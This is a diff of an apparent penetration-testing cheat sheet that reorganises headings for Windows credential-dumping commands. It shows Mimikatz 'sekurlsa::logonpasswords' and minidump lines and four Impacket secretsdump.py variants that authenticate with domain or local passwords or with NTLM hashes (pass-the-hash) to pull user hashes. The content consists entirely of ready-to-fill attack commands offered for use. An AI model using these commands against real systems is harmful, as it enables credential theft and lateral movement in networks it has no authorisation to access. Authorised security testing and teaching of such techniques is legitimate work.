@@ -31,16 +31,23 @@ date: 2022-12-10
     sekurlsa::minidump file.DMP (If there is a DMP file)
     sekurlsa::logonpasswords full
     
- ### Impacket Secretsdump - DUMP Local User Hashes
+### Impacket secretsdump - DUMP Local User Hashes via Domain Creds
  
     python3 secretsdump.py <Domain>/<Domain Username>:<Password>@<IP> (Enter with Domain Creds)
     
-    python3 secretsdump.py <Computer_Hostname>/<Local Username>:<Password>@<IP> (Enter with Local Creds)
-    
+### Impacket secretsdump - DUMP Local User Hashes via Domain NTLM Hash
+
     python3 secretsdump.py <Domain>/<Domain Username>@<IP> -hashes <NTLM Hash> (Enter with NTLM Hash)
     
+### Impacket secretsdump - DUMP Local User Hashes via Domain Local User Creds
+    
+    python3 secretsdump.py <Computer_Hostname>/<Local Username>:<Password>@<IP> (Enter with Local Creds)
+    
+### Impacket secretsdump - DUMP Local User Hashes via Domain Local User Hash
+
     python3 secretsdump.py <Computer_Hostname>/<Local Username>@<IP> -hashes <NTLM Hash> (Enter with NTLM Hash)
     
     
     
- 
+    
+    
